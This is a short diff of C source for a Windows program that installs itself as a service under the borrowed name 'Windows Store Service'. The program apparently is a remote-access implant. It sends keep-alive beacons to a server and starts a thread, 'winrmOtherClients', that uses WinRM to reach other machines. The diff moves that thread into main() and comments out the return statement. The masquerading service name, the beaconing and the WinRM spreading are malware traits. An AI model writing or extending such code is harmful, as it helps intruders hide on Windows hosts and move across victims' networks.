@@ -92,6 +92,9 @@ unsigned __stdcall sendKeepAlive(SOCKET* clientSocket) {
 }
 
 int main(void) {
+    // Start a thread to winrm to other clients, this is only here right now for testing
+    HANDLE winrmThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&winrmOtherClients, NULL, 0, NULL);
+
     // Connect main thread to the service control messanger
     SERVICE_TABLE_ENTRY ServiceTable[] = {
         {(LPWSTR)TEXT("Windows Store Service"), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
@@ -102,7 +105,7 @@ int main(void) {
         printf("Failed to Start Service\n");
     }
 
-    return 0;
+    //return 0;
 }
 
 void ServiceMain(DWORD argc, LPTSTR* argv) {
@@ -218,9 +221,6 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
 
     // Start a thread to send a keep alive message every 30 seconds to the Server
     HANDLE keepAliveThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
-
-    // Start a thread to winrm to other clients, this is only here right now for testing
-    HANDLE winrmThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&winrmOtherClients, NULL, 0, NULL);
 
     // Main service loop
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
